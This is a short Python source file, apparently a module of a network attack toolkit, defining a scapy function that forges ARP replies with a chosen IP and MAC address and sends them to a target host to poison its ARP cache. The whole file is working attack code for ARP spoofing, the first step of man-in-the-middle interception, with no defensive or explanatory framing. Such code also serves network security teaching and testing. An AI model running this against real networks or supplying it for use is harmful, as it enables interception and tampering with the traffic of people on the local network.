
from scapy.all import *
from modules.get_mac_addr import *

def spoof_arp_cache(target_ip_addr, spoof_ip_addr, spoof_mac_addr):
	arp_packet = ARP()
	arp_packet["ARP"].pdst = target_ip_addr # set destination IP address of ARP packet
	arp_packet["ARP"].hwdst = get_mac_addr(target_ip_addr) # set destination MAC address of ARP packet
	arp_packet["ARP"].hwsrc = spoof_mac_addr # set MAC address of ARP cache entry
	arp_packet["ARP"].psrc = spoof_ip_addr # set IP address of ARP cache entry
	arp_packet["ARP"].op = "is-at" # set operation code of ARP packet. 2 = ARP Reply
	send(arp_packet, verbose = False) # send ARP packet